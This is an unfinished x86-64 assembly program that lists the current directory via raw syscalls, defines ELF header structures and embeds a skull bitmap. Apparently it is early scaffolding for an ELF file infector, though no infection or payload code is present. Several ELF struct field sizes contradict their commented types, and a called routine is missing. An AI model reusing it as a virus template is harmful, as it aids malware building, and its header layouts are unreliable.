BITS 64


section .bss
	struc linuxdirent
		.d_ino:			resq 1
		.d_off:			resq 1
		.d_reclen:		resw 1
		.d_type:		resb 1
		.d_nameq:		resw 1
	endstruc
	
	struc file_stat
		.st_de			resq 1	;ID of dev containing file
		.st_ino			resq 1	;inode #
		.st_mode		resq 1	;protection
		.st_nlink		resq 1	;# of hard links
		.st_uid			resq 1	;user id of owner
		.st_gid			resq 1	;group Id of owner
		.st_rdev		resq 1 	;dev ID 
		.st_size		resq 1	;total size in bytes
		.st_blksize		resq 1	; blocksize for fs i/o
		.st_blocks		resq 1	;# of 512b blocks allocated
		.st_atime		resq 1	;time of last file access
		.st_mtime		resq 1	;time of last file mod
		.st_ctime		resq 1	;time of last file status changea
	endstruc

	struc elf_Ehdr
		.e_ident		resq 1		; unsigned char
		.e_type			resb 1		; uint16_t
		.e_machine		resb 1		; uint16_t
		.e_version		resw 1		; uint32_t
		.e_entry		resq 1		; ElfN_Addr
        .e_phoff		resq 1		; ElfN_Off 
        .e_shoff		resq 1		; ElfN_Off 
        .e_flags		resw 1		; uint32_t 
        .e_ehsize		resb 1		; uint16_t 
        .e_phentsize	resb 1		; uint16_t 
        .e_phnum		resb 1		; uint16_t 
        .e_shentsize	resb 1		; uint16_t 
        .e_shnum		resb 1		; uint16_t 
        .e_shstrndx		resb 1		; uint16_t 
	endstruc

	struc elf_phdr
		.p_type			resw 1		;  uint32_t   
		.p_flags		resw 1		;  uint32_t   
		.p_offset		resq 1		;  Elf64_Off  
		.p_vaddr		resq 1		;  Elf64_Addr 
		.p_paddr		resq 1		;  Elf64_Addr 
		.p_filesz		resq 1		;  uint64_t   
		.p_memsz		resq 1		;  uint64_t   
		.p_align		resq 1		;  uint64_t   
	endstruc

	struc elf_shdr
    	.sh_name		resw 1		; uint32_t   
    	.sh_type		resw 1		; uint32_t   
    	.sh_flags		resq 1		; uint64_t   
    	.sh_addr		resq 1		; Elf64_Addr 
     	.sh_offset		resq 1		; Elf64_Off  
     	.sh_size		resq 1		; uint64_t   
     	.sh_link		resw 1		; uint32_t   
     	.sh_info		resw 1		; uint32_t   
     	.sh_addralign	resq 1		; uint64_t   
     	.sh_entsize		resq 1		; uint64_t   
	endstruc



	;root_dirent: resb linuxdirent_size



section .data

;x64 syscall reference

SYS_READ 		equ 0x0
SYS_WRITE 		equ 0x1
SYS_OPEN 		equ 0x2
SYS_CLOSE 		equ 0x3
SYS_FSTAT 		equ 0x5
SYS_MMAP 		equ 0x9
SYS_EXIT		equ 0x3c
SYS_GETDENTS64	equ 0x4e

teststr db 'boo', 13,10,0
teststrlen equ $-teststr

targetdir db '.',0
targetdirlen equ $-targetdir

fd	dq 0
fdlen equ $-fd
;framebuffer:
;	db `//dev//fb0`,0
;framebuflen equ $-framebuffer
;;
STDOUT			equ 0x1


;open() syscall parameter reference 
OPEN_RDWR		equ 0x2
O_RDONLY		equ 0x0


PROT_READ		equ 0x1
PROT_WRITE		equ 0x2
MAP_PRIVATE		equ 0x2

;ELF header vals
ELFCLASS64 		equ 0x2

;D_TYPE values
DT_REG 			equ 0x8

;MAX_RDENT_BUF:	db 0x200 dup (?)
MAX_RDENT_BUF	times 0x400 db 0 
MAX_RDENT_BUF_SIZE equ 0x400

num_dir_entries resq 0x0
root_dirent:	dq 0 
;	istruc linuxdirent iend
;times 0x400 db 0 
;dw 0x200

;;file pointed to by fstat is fd
section .text
global _start
_start:
	push rbp
	mov rbp, rsp
	sub rsp, 0x400
	mov r14, rsp

	_getdirents:
;****************************************************************************************
; open - syscall 0x2
;;open(filename, flags, mode);
;;rdi == filename
;;rsi == flags
;rdx == mode
;; returns: fd (in rax, obv)
;****************************************************************************************
	;push "."
	;pop rdi
	mov rdi, targetdir
	xor rsi, rsi 		;no flags
	add rsi, 0x02000000
	mov rdx, O_RDONLY	;open read-only
	mov rax, SYS_OPEN
	syscall
	
	mov r9, rax						;fd into r9
;	mov [fd], rax
;****************************************************************************************
; getdents64 - syscall 0x4e
;; getdents(unsigned int fd, struct linuxdirent *dirent, unsigned int count);
;;rdi == fd
;;rsi == *dirent
;rdx == count
;returns # entries in rax
;[r14 v+ 600 +dirent] holds the pointer to the first dirent struct
;so we can iterate through all dirent entries using the size field in this dirent struc
;as an offset for successive jumps in address space	
;****************************************************************************************
	;push r9
	;pop rdi
	mov rdi, rax
;	lea rsi, [r14 + 200 + linuxdirent] ;r14 + 200 is location on the stack where we'll save our dirent struct
;	mov rsi, [r14 + 200 + linuxdirent] ;r14 + 200 is location on the stack where we'll save our dirent struct
	lea rsi, [r14 + 600 + linuxdirent] 
	;mov rsi, [root_dirent]
	;mov rdi, [fd]
	;mov rsi, linuxdirent
	mov rdx, MAX_RDENT_BUF_SIZE
	mov rax, SYS_GETDENTS64
	syscall


	mov r8, rax					;# of dirent entries in r8
	mov [root_dirent], rsi
	;add rsi, linuxdirent.d_nameq
;	call _write
	mov [r14 + 200], rax		;save # of dir entries to local var on stack
	;mov [root_dirent], rax	
;****************************************************************************************
; close - syscall 0x3
;;close(fd);
;;rdi == fd (file descriptor)
;; returns: 0 on success (-1 on error)
;****************************************************************************************
	mov rdi, r9
	mov rax, SYS_CLOSE
	syscall
	
	xor rcx, rcx	
	call _write
	call paint
;	jmp check_file

	jmp printteststr
;****************************************************************************************
; write - syscall 0x1
;;rdi == fd (file descriptor)
;;rsi == const char* buf
;rdx == count (# of bytes to write)
;; returns: 0 on success (-1 on error)
;****************************************************************************************
_write:
;		mov rsi, linuxdirent.d_nameq
		lea rsi, [r14 + 600 + linuxdirent.d_nameq]
		;mov rsi, [rcx + r14 + 200 + root_dirent]
		;mov rsi, qword [root_dirent + linuxdirent.d_nameq]
		
		;;mov rax, [root_dirent]
		;;mov rsi, [rax + linuxdirent.d_nameq]
		;lea rsi, [rax]
		;mov rax, root_dirent+.d_nameq
		;add rax, 21*8
		;mov rsi, rax
		;mov rsi, num_dir_entries
		;mov rsi, [rax + .d_nameq]
		;mov rsi, rax
		;mov rsi, [root_dirent.d_nameq]
		;mov rsi, fd
		mov rdi, STDOUT
		mov rdx, 16
		mov rax, SYS_WRITE
		syscall
		ret

	;	call paint
		skullbitmap:
			dd 0x7fff8500,0x7fff7e00,0x7fff7b00,0x7fff7b00,0x7fff7900,0x7fff7600,0x7fff7300,0x7fff7100,0x7fff6d00,0x7fff6a00,0x7fff6900,0x7fff6600,0x7fff6400,0x7fff6300,0x7fff6100,0x7fff5f00,0x7fff5d00,0x7fff5c00,0x7fff5b00,0x7fff5a00,0x7fff5a00,0x7fff5900,0x7fff5700,0x7fff5600,0x7fff5500,0x7fff5500,0x7fff5400,0x7fff5400,0x7fff5500,0x7fff5500,0x7fff5400,0x7fff5500,0x7fff5700,0x7fff5b00,0x7fff6000,0x7fff6600,0x7fff7700,0x7fff7f00,0x7fff7500,0x7fff7100,0x7fff6f00,0x7fff6e00,0x7fff6c00,0x7fff6b00,0x7fff6b00,0x7fff6c00,0x7fff6f00,0x7fff7300,0x7fff7600,0x7fff7800,0x7fff7a00,0x7fff7d00,0x7fff7f00,0x7fff8200,0x7fff8500,0x7fff8600,0x7fff8900,0x7fff8d00,0x7fff8f00,0x7fff9200,0x7fff9400,0x7fff9700,0x7fff9800,0x7fff9a00,0x7fff0a7f
			dd 0x7fff7700,0x7fff7200,0x7fff7000,0x7fff7000,0x7fff6d00,0x7fff6a00,0x7fff6700,0x7fff6400,0x7fff6200,0x7fff5f00,0x7fff5d00,0x7fff5b00,0x7fff5900,0x7fff5700,0x7fff5600,0x7fff5400,0x7fff5200,0x7fff5100,0x7fff5000,0x7fff4f00,0x7fff4e00,0x7fff4d00,0x7fff4c00,0x7fff4b00,0x7fff4b00,0x7fff4b00,0x7fff4b00,0x7fff4b00,0x7fff4c00,0x7fff4e00,0x7fff5200,0x7fff5d00,0x7fff5e00,0x7fff5800,0x7fff5500,0x7fff5400,0x7fff5700,0x7fff5600,0x7fff5300,0x7fff5200,0x7fff5200,0x7fff5400,0x7fff5700,0x7fff5b00,0x7fff5f00,0x7fff6500,0x7fff6a00,0x7fff6a00,0x7fff6a00,0x7fff6d00,0x7fff6f00,0x7fff7100,0x7fff7500,0x7fff7a00,0x7fff7c00,0x7fff7e00,0x7fff8100,0x7fff8500,0x7fff8800,0x7fff8a00,0x7fff8c00,0x7fff8e00,0x7fff8f00,0x7fff8f7f
			dd 0x7fff6a00,0x7fff6500,0x7fff6300,0x7fff6400,0x7fff6100,0x7fff5e00,0x7fff5c00,0x7fff5a00,0x7fff5700,0x7fff5400,0x7fff5300,0x7fff5200,0x7fff5000,0x7fff4e00,0x7fff4c00,0x7fff4a00,0x7fff4800,0x7fff4600,0x7fff4500,0x7fff4400,0x7fff4300,0x7fff4200,0x7fff4100,0x7fff4000,0x7fff4100,0x7fff4400,0x7fff4700,0x7fff4800,0x7fff4600,0x7fff4600,0x7fff4600,0x7fff4500,0x7fff4200,0x7fff4000,0x7fff4100,0x7fff4400,0x7fff4900,0x7fff4e00,0x7fff4f00,0x7fff5800,0x7fff5b00,0x7fff5600,0x7fff5800,0x7fff5800,0x7fff5800,0x7fff5900,0x7fff5b00,0x7fff5c00,0x7fff5c00,0x7fff5d00,0x7fff5f00,0x7fff6100,0x7fff6400,0x7fff6600,0x7fff6800,0x7fff6b00,0x7fff6e00,0x7fff7100,0x7fff7500,0x7fff7b00,0x7fff7f00,0x7fff8300,0x7fff8600,0x7fff8c7f
			dd 0x7fff5e00,0x7fff5b00,0x7fff5900,0x7fff5a00,0x7fff5700,0x7fff5400,0x7fff5200,0x7fff5000,0x7fff4d00,0x7fff4b00,0x7fff4a00,0x7fff4a00,0x7fff4700,0x7fff4400,0x7fff4200,0x7fff4000,0x7fff3d00,0x7fff3c00,0x7fff3a00,0x7fff3a00,0x7fff3900,0x7fff3900,0x7fff3a00,0x7fff3d00,0x7fff3f00,0x7fff3d00,0x7fff3900,0x7fff3600,0x7fff3600,0x7fff3700,0x7fff3c00,0x7fff4000,0x7fff4a00,0x7fff5700,0x7fff6400,0x7fff6500,0x7fff5d00,0x7fff4f00,0x7fff4300,0x7fff4800,0x7fff4900,0x7fff4200,0x7fff4300,0x7fff4400,0x7fff4500,0x7fff4700,0x7fff4800,0x7fff4a00,0x7fff4c00,0x7fff4e00,0x7fff5000,0x7fff5300,0x7fff5600,0x7fff5800,0x7fff5b00,0x7fff5d00,0x7fff6000,0x7fff6400,0x7fff6700,0x7fff6b00,0x7fff6e00,0x7fff7100,0x7fff7500,0x7fff7b7f
			dd 0x7fff5400,0x7fff5100,0x7fff4f00,0x7fff5000,0x7fff4d00,0x7fff4900,0x7fff4600,0x7fff4400,0x7fff4200,0x7fff4000,0x7fff3f00,0x7fff3d00,0x7fff3a00,0x7fff3800,0x7fff3600,0x7fff3500,0x7fff3300,0x7fff3200,0x7fff3200,0x7fff3200,0x7fff3600,0x7fff3700,0x7fff3600,0x7fff3200,0x7fff2e00,0x7fff2e00,0x7fff3400,0x7fff4000,0x7fff4b00,0x7fff5c00,0x7fff6c00,0x7fff7400,0x7fff7700,0x7fff6700,0x7fff5700,0x7fff3c00,0x7fff3300,0x7fff3600,0x7fff3f00,0x7fff4600,0x7fff3a00,0x7fff3900,0x7fff3b00,0x7fff3c00,0x7fff3d00,0x7fff3f00,0x7fff4100,0x7fff4000,0x7fff4200,0x7fff4400,0x7fff4600,0x7fff4900,0x7fff4b00,0x7fff4e00,0x7fff4f00,0x7fff5200,0x7fff5500,0x7fff5800,0x7fff5b00,0x7fff5e00,0x7fff6200,0x7fff6500,0x7fff6a00,0x7fff6f7f
			dd 0x7fff4a00,0x7fff4700,0x7fff4600,0x7fff4800,0x7fff4300,0x7fff4000,0x7fff3d00,0x7fff3b00,0x7fff3900,0x7fff3700,0x7fff3600,0x7fff3400,0x7fff3100,0x7fff2e00,0x7fff2d00,0x7fff2d00,0x7fff2b00,0x7fff2b00,0x7fff3000,0x7fff3800,0x7fff2f00,0x7fff2900,0x7fff2700,0x7fff2700,0x7fff3700,0x7fff6200,0x7fff7e00,0x7fff8000,0x7fff7200,0x7fff6200,0x7fff5a00,0x7fff5000,0x7fff3800,0x7fff2c00,0x7fff2b00,0x7fff2a00,0x7fff2a00,0x7fff3900,0x7fff3700,0x7fff3600,0x7fff2e00,0x7fff2d00,0x7fff2e00,0x7fff3000,0x7fff3100,0x7fff3300,0x7fff3500,0x7fff3500,0x7fff3800,0x7fff3900,0x7fff3d00,0x7fff4400,0x7fff4200,0x7fff4300,0x7fff4700,0x7fff4900,0x7fff4a00,0x7fff4e00,0x7fff5200,0x7fff5400,0x7fff5700,0x7fff5a00,0x7fff5f00,0x7fff657f
			dd 0x7fff4100,0x7fff3e00,0x7fff3d00,0x7fff3f00,0x7fff3a00,0x7fff3700,0x7fff3500,0x7fff3300,0x7fff3000,0x7fff2e00,0x7fff2e00,0x7fff2b00,0x7fff2800,0x7fff2700,0x7fff2600,0x7fff2600,0x7fff2800,0x7fff2f00,0x7fff3400,0x7fff2c00,0x7fff2200,0x7fff2600,0x7fff3c00,0x7fff5b00,0x7fff7900,0x7fff7500,0x7fff7200,0x7fff6500,0x7fff4900,0x7fff3a00,0x7fff3500,0x7fff3400,0x7fff2b00,0x7fff2900,0x7fff2900,0x7fff2d00,0x7fff3700,0x7fff4e00,0x7fff3c00,0x7fff3100,0x7fff2500,0x7fff2500,0x7fff2600,0x7fff2700,0x7fff2900,0x7fff2a00,0x7fff2c00,0x7fff2d00,0x7fff2f00,0x7fff3100,0x7fff3600,0x7fff4d00,0x7fff3e00,0x7fff3900,0x7fff3c00,0x7fff3e00,0x7fff4100,0x7fff4500,0x7fff4800,0x7fff4a00,0x7fff4c00,0x7fff4f00,0x7fff5600,0x7fff5a7f
			dd 0x7fff3700,0x7fff3400,0x7fff3400,0x7fff3600,0x7fff3100,0x7fff2e00,0x7fff2c00,0x7fff2900,0x7fff2700,0x7fff2700,0x7fff2700,0x7fff2600,0x7fff2300,0x7fff2200,0x7fff2100,0x7fff2900,0x7fff2f00,0x7fff2400,0x7fff1f00,0x7fff2b00,0x7fff4c00,0x7fff6f00,0x7fff7200,0x7fff6200,0x7fff5500,0x7fff4b00,0x7fff4000,0x7fff3300,0x7fff2900,0x7fff2700,0x7fff2700,0x7fff2700,0x7fff2700,0x7fff2700,0x7fff2900,0x7fff2b00,0x7fff2900,0x7fff3800,0x7fff2800,0x7fff2200,0x7fff2000,0x7fff2100,0x7fff2100,0x7fff2200,0x7fff2300,0x7fff2400,0x7fff2500,0x7fff2700,0x7fff3900,0x7fff4900,0x7fff4000,0x7fff4700,0x7fff3000,0x7fff3200,0x7fff3500,0x7fff3500,0x7fff3800,0x7fff3c00,0x7fff3e00,0x7fff4200,0x7fff4400,0x7fff4900,0x7fff5000,0x7fff537f
			dd 0x7fff2f00,0x7fff2c00,0x7fff2d00,0x7fff2d00,0x7fff2800,0x7fff2700,0x7fff2400,0x7fff2200,0x7fff2100,0x7fff2100,0x7fff2100,0x7fff1f00,0x7fff1d00,0x7fff1d00,0x7fff2a00,0x7fff2c00,0x7fff1b00,0x7fff2000,0x7fff4b00,0x7fff6a00,0x7fff4e00,0x7fff3100,0x7fff2200,0x7fff2200,0x7fff2000,0x7fff1900,0x7fff1600,0x7fff1400,0x7fff1500,0x7fff1500,0x7fff1500,0x7fff1700,0x7fff1800,0x7fff1900,0x7fff1800,0x7fff1700,0x7fff1900,0x7fff2600,0x7fff1900,0x7fff1a00,0x7fff1c00,0x7fff1d00,0x7fff1e00,0x7fff1f00,0x7fff1f00,0x7fff1f00,0x7fff2500,0x7fff3900,0x7fff4a00,0x7fff3200,0x7fff2500,0x7fff2600,0x7fff2800,0x7fff2a00,0x7fff2e00,0x7fff2e00,0x7fff3100,0x7fff3400,0x7fff3700,0x7fff3a00,0x7fff3d00,0x7fff4200,0x7fff4800,0x7fff4d7f
			dd 0x7fff2700,0x7fff2500,0x7fff2600,0x7fff2600,0x7fff2200,0x7fff2000,0x7fff1e00,0x7fff1d00,0x7fff1b00,0x7fff1b00,0x7fff1b00,0x7fff1a00,0x7fff1800,0x7fff2b00,0x7fff3000,0x7fff1900,0x7fff2300,0x7fff8100,0x7fff6e00,0x7fff2e00,0x7fff1d00,0x7fff1600,0x7fff1300,0x7fff1400,0x7fff1300,0x7fff1200,0x7fff1100,0x7fff1200,0x7fff1200,0x7fff1200,0x7fff1200,0x7fff1400,0x7fff1300,0x7fff1200,0x7fff1300,0x7fff1300,0x7fff1300,0x7fff2000,0x7fff1600,0x7fff1500,0x7fff1500,0x7fff1700,0x7fff1a00,0x7fff2700,0x7fff3b00,0x7fff4000,0x7fff4300,0x7fff4000,0x7fff2100,0x7fff1d00,0x7fff1e00,0x7fff1f00,0x7fff2200,0x7fff2400,0x7fff2600,0x7fff2800,0x7fff2a00,0x7fff2c00,0x7fff2f00,0x7fff3300,0x7fff3600,0x7fff3a00,0x7fff3f00,0x7fff457f
			dd 0x7fff2200,0x7fff1f00,0x7fff2100,0x7fff1f00,0x7fff1c00,0x7fff1a00,0x7fff1900,0x7fff1900,0x7fff1800,0x7fff1700,0x7fff1700,0x7fff1700,0x7fff2200,0x7fff4c00,0x7fff1f00,0x7fff1600,0x7fff8000,0x7fff9400,0x7fff4600,0x7fff2000,0x7fff1300,0x7ffff00,0x7ffff00,0x7fff1000,0x7fff1100,0x7fff1100,0x7fff1000,0x7ffff00,0x7fff1000,0x7fff1000,0x7ffff00,0x7ffff00,0x7fff1000,0x7fff1000,0x7fff1200,0x7fff1300,0x7fff1200,0x7fff1a00,0x7fff1500,0x7fff1300,0x7fff1800,0x7fff1f00,0x7fff1d00,0x7fff1c00,0x7fff2300,0x7fff4500,0x7fff2400,0x7fff1700,0x7fff1800,0x7fff1900,0x7fff1a00,0x7fff1b00,0x7fff1c00,0x7fff1e00,0x7fff2000,0x7fff2200,0x7fff2500,0x7fff2600,0x7fff2900,0x7fff2c00,0x7fff2f00,0x7fff3300,0x7fff3700,0x7fff3c7f
			dd 0x7fff1c00,0x7fff1b00,0x7fff1c00,0x7fff1a00,0x7fff1700,0x7fff1600,0x7fff1500,0x7fff1400,0x7fff1500,0x7fff1500,0x7fff1500,0x7fff1a00,0x7fff3a00,0x7fff1f00,0x7fff1300,0x7fff5400,0x7fffad00,0x7fff7200,0x7fff4200,0x7fff1400,0x7fffd00,0x7fffc00,0x7fffc00,0x7fffd00,0x7fffe00,0x7ffff00,0x7fffe00,0x7fffd00,0x7fffd00,0x7fffd00,0x7fffd00,0x7fffd00,0x7ffff00,0x7fff1a00,0x7fff2200,0x7fff2000,0x7fff1800,0x7fff2200,0x7fff2500,0x7fff2800,0x7fff2100,0x7fff1800,0x7fff1000,0x7fff1900,0x7fff4500,0x7fff3300,0x7fff1800,0x7fff1300,0x7fff1500,0x7fff1600,0x7fff1700,0x7fff1600,0x7fff1800,0x7fff1a00,0x7fff1c00,0x7fff1e00,0x7fff1f00,0x7fff2100,0x7fff2400,0x7fff2700,0x7fff2a00,0x7fff2e00,0x7fff3300,0x7fff377f
			dd 0x7fff1700,0x7fff1700,0x7fff1900,0x7fff1600,0x7fff1500,0x7fff1300,0x7fff1100,0x7fff1000,0x7fff1000,0x7fff1100,0x7fff1000,0x7fff1f00,0x7fff3c00,0x7fffd00,0x7fff1000,0x7fff9800,0x7fff9a00,0x7fff6100,0x7fff2500,0x7fffa00,0x7fff900,0x7fffa00,0x7fffb00,0x7fffb00,0x7fffb00,0x7fffb00,0x7fffb00,0x7fffc00,0x7fffd00,0x7fffc00,0x7fffd00,0x7fff1500,0x7fff1700,0x7fff2900,0x7fff2f00,0x7fff2700,0x7fff3f00,0x7fff5100,0x7fff3800,0x7fff2500,0x7fff1b00,0x7fff1900,0x7fff2400,0x7fff2900,0x7fff4900,0x7fff1300,0x7ffff00,0x7ffff00,0x7fff1000,0x7fff1200,0x7fff1400,0x7fff1400,0x7fff1400,0x7fff1700,0x7fff1800,0x7fff1a00,0x7fff1c00,0x7fff1e00,0x7fff2000,0x7fff2200,0x7fff2600,0x7fff2a00,0x7fff3000,0x7fff347f
			dd 0x7fff1300,0x7fff1300,0x7fff1600,0x7fff1400,0x7fff1100,0x7ffff00,0x7fffe00,0x7fffe00,0x7fffd00,0x7fffd00,0x7fffc00,0x7fff1a00,0x7fff2d00,0x7fffb00,0x7fff1a00,0x7fff9f00,0x7fff8100,0x7fff4800,0x7fff1300,0x7fffc00,0x7fff800,0x7fff800,0x7fffa00,0x7fffa00,0x7fff900,0x7fff900,0x7fff900,0x7fffa00,0x7fffb00,0x7fffb00,0x7fffe00,0x7fff1900,0x7fff1b00,0x7fff4600,0x7fff5500,0x7fff3c00,0x7fff3f00,0x7fff3b00,0x7fff1b00,0x7fff1900,0x7fff1700,0x7fff1700,0x7fff2000,0x7fff1700,0x7fff1300,0x7fffe00,0x7fffe00,0x7fffd00,0x7fffd00,0x7fffe00,0x7fff1000,0x7fff1100,0x7fff1100,0x7fff1400,0x7fff1500,0x7fff1700,0x7fff1900,0x7fff1a00,0x7fff1c00,0x7fff1e00,0x7fff2300,0x7fff2700,0x7fff2b00,0x7fff307f
			dd 0x7fff1000,0x7fff1100,0x7fff1300,0x7fff1000,0x7fffe00,0x7fffd00,0x7fffc00,0x7fffc00,0x7fffb00,0x7fffb00,0x7fffa00,0x7fff2300,0x7fff3700,0x7fff1500,0x7fff1b00,0x7fffa400,0x7fff8f00,0x7fff3600,0x7fff1700,0x7fffe00,0x7fffa00,0x7fff700,0x7fff900,0x7fffa00,0x7fff800,0x7fff800,0x7fff900,0x7fff900,0x7fff900,0x7fffa00,0x7fff900,0x7fff800,0x7fff1000,0x7fff5300,0x7fff5300,0x7fff3b00,0x7fff2700,0x7fff1200,0x7fff900,0x7fffb00,0x7fff1000,0x7fffb00,0x7fffa00,0x7fffb00,0x7fffa00,0x7fffa00,0x7fffb00,0x7fffb00,0x7fffb00,0x7fffc00,0x7fffd00,0x7ffff00,0x7ffff00,0x7fff1100,0x7fff1400,0x7fff1400,0x7fff1700,0x7fff1800,0x7fff1a00,0x7fff1b00,0x7fff1f00,0x7fff2400,0x7fff2800,0x7fff2c7f
			dd 0x7fffe00,0x7ffff00,0x7fff1100,0x7fffe00,0x7fffc00,0x7fffb00,0x7fffa00,0x7fffa00,0x7fffa00,0x7fffa00,0x7ffff00,0x7fff3500,0x7fff3f00,0x7fff1a00,0x7fffe00,0x7fff3400,0x7fff6c00,0x7fff6500,0x7fff4f00,0x7fff3c00,0x7fff2c00,0x7fff2300,0x7fff2200,0x7fff2200,0x7fff1d00,0x7fff1800,0x7fff1800,0x7fff1700,0x7fff1b00,0x7fff2b00,0x7fffd00,0x7fff800,0x7fffa00,0x7fff2e00,0x7fff5c00,0x7fff6400,0x7fff5500,0x7fff3200,0x7fff1b00,0x7fff2100,0x7fff2500,0x7fff1c00,0x7fff1300,0x7fff1000,0x7fffe00,0x7fffa00,0x7fffa00,0x7fffa00,0x7fffa00,0x7fffa00,0x7fffb00,0x7fffc00,0x7fffc00,0x7fffe00,0x7fff1000,0x7fff1200,0x7fff1300,0x7fff1600,0x7fff1700,0x7fff1800,0x7fff1b00,0x7fff1f00,0x7fff2400,0x7fff2a7f
			dd 0x7fffc00,0x7fffe00,0x7fffe00,0x7fffc00,0x7fffa00,0x7fff900,0x7fff800,0x7fff900,0x7fff900,0x7fff800,0x7fff1f00,0x7fff3100,0x7fff2000,0x7fff1e00,0x7fff1500,0x7fff1e00,0x7fff3300,0x7fff5100,0x7fff4100,0x7fff2e00,0x7fff1a00,0x7fff2100,0x7fff3500,0x7fff4500,0x7fff3b00,0x7fff2c00,0x7fff2600,0x7fff1e00,0x7fff2200,0x7fff6500,0x7fff2100,0x7fff700,0x7fff700,0x7fffc00,0x7fff2a00,0x7fff3600,0x7fff3900,0x7fff3400,0x7fff3100,0x7fff2b00,0x7fff2400,0x7fff1800,0x7fff1a00,0x7fff1100,0x7fff1600,0x7fff1300,0x7fffc00,0x7fffa00,0x7fff900,0x7fff900,0x7fffa00,0x7fffa00,0x7fffa00,0x7fffc00,0x7fffe00,0x7ffff00,0x7fff1000,0x7fff1200,0x7fff1400,0x7fff1600,0x7fff1900,0x7fff1d00,0x7fff2200,0x7fff277f
			dd 0x7fffa00,0x7fffd00,0x7fffc00,0x7fffb00,0x7fff900,0x7fff800,0x7fff700,0x7fff700,0x7fff700,0x7fff700,0x7fff1f00,0x7fff3300,0x7fff2700,0x7fff1500,0x7fff2f00,0x7fff9000,0x7fffaa00,0x7fffb400,0x7fffb000,0x7fff9600,0x7fff5a00,0x7fff3100,0x7fff1e00,0x7fff1300,0x7fffe00,0x7fffd00,0x7fffd00,0x7fffb00,0x7ffff00,0x7fff5d00,0x7fff3300,0x7fff1e00,0x7fff800,0x7fff500,0x7fffa00,0x7fff1b00,0x7fff1400,0x7fff900,0x7fff1100,0x7fff4600,0x7fff2c00,0x7fff1900,0x7fff2300,0x7fff2100,0x7fff1700,0x7fffe00,0x7fff800,0x7fff700,0x7fff700,0x7fff700,0x7fff800,0x7fff900,0x7fff900,0x7fffa00,0x7fffb00,0x7fffd00,0x7fffe00,0x7ffff00,0x7fff1200,0x7fff1400,0x7fff1600,0x7fff1a00,0x7fff1f00,0x7fff257f
			dd 0x7fff900,0x7fffc00,0x7fffb00,0x7fff900,0x7fff800,0x7fff600,0x7fff600,0x7fff600,0x7fff600,0x7fff600,0x7fffe00,0x7fff2c00,0x7fff3100,0x7fff4400,0x7fff7000,0x7fffb200,0x7fffa500,0x7fffa400,0x7fff8f00,0x7fff9700,0x7fff5100,0x7fff1200,0x7fff600,0x7fff600,0x7fff700,0x7fff800,0x7fffa00,0x7fffa00,0x7fffa00,0x7fff3700,0x7fff5400,0x7fff6b00,0x7fff5200,0x7fff5000,0x7fff4700,0x7fff4200,0x7fff3400,0x7fff2800,0x7fff2500,0x7fff2a00,0x7fff2c00,0x7fff1f00,0x7fff2500,0x7fff1a00,0x7fffe00,0x7fff700,0x7fff500,0x7fff500,0x7fff600,0x7fff700,0x7fff900,0x7fff900,0x7fff900,0x7fffa00,0x7fffb00,0x7fffc00,0x7fffe00,0x7ffff00,0x7fff1100,0x7fff1400,0x7fff1600,0x7fff1800,0x7fff1c00,0x7fff237f
			dd 0x7fff800,0x7fffa00,0x7fff900,0x7fff800,0x7fff700,0x7fff500,0x7fff500,0x7fff500,0x7fff500,0x7fff500,0x7fff500,0x7fff500,0x7fffb00,0x7fff3700,0x7fff8000,0x7fff9d00,0x7fffa600,0x7fff8400,0x7fff5400,0x7fff3a00,0x7fffc00,0x7fff1b00,0x7fff4100,0x7fff3900,0x7fff2300,0x7fff1700,0x7fff1600,0x7fff1900,0x7fff1e00,0x7fff2300,0x7fff3900,0x7fff6000,0x7fff7700,0x7fff6d00,0x7fff3d00,0x7fff2a00,0x7fff3900,0x7fff6c00,0x7fff6700,0x7fff1400,0x7fff700,0x7fff800,0x7fff1c00,0x7fff3a00,0x7fff1c00,0x7fff1000,0x7fffa00,0x7fff600,0x7fff600,0x7fff600,0x7fff700,0x7fff900,0x7fff900,0x7fffc00,0x7fffd00,0x7ffff00,0x7fff1200,0x7fff1700,0x7fff1900,0x7fff1d00,0x7fff2100,0x7fff2400,0x7fff2400,0x7fff2a7f
			dd 0x7fff700,0x7fff800,0x7fff700,0x7fff600,0x7fff500,0x7fff500,0x7fff500,0x7fff500,0x7fff800,0x7fff1100,0x7fff1200,0x7fff1d00,0x7fff2d00,0x7fff4200,0x7fff7000,0x7fff8000,0x7fff6c00,0x7fff4300,0x7fff4900,0x7fff1d00,0x7fff400,0x7fff1200,0x7fff7500,0x7fff2f00,0x7fff4200,0x7fff4e00,0x7fff3d00,0x7fff4200,0x7fff4900,0x7fff5c00,0x7fff3200,0x7fff5600,0x7fff8100,0x7fff5e00,0x7fff3300,0x7fff1100,0x7fff1100,0x7fff2100,0x7fff8100,0x7fff1800,0x7fff300,0x7fff400,0x7fff1200,0x7fff6500,0x7fff6200,0x7fff3000,0x7fff2900,0x7fff3000,0x7fff2700,0x7fff1b00,0x7fff1200,0x7fff1400,0x7fff1300,0x7fff1400,0x7fff1400,0x7fff1100,0x7fff1100,0x7fff1400,0x7fff1500,0x7fff1a00,0x7fff2300,0x7fff2d00,0x7fff2600,0x7fff287f
			dd 0x7fff700,0x7fff800,0x7fff600,0x7fff500,0x7fff400,0x7fff500,0x7fff1100,0x7fff1d00,0x7fff2800,0x7fff2700,0x7fff1f00,0x7fff4300,0x7fff3600,0x7fff1a00,0x7fff1400,0x7fff1500,0x7fff1c00,0x7fff2600,0x7fff1000,0x7fff400,0x7fff600,0x7fff2500,0x7fff7400,0x7fff2500,0x7fffd00,0x7fffb00,0x7fff1000,0x7fff4a00,0x7fff6000,0x7fff7e00,0x7fff1900,0x7fff1c00,0x7fff5800,0x7fff2800,0x7fff2f00,0x7ffff00,0x7fff800,0x7fff1700,0x7fff6f00,0x7fff6000,0x7fff5300,0x7fff4900,0x7fff6000,0x7fff6200,0x7fff2500,0x7fff3900,0x7fff1f00,0x7fff700,0x7fffe00,0x7fff2500,0x7fff2c00,0x7fff1d00,0x7ffff00,0x7fffa00,0x7fff900,0x7fff900,0x7fffb00,0x7fffc00,0x7fffe00,0x7fff1100,0x7fff1300,0x7fff1800,0x7fff1d00,0x7fff227f
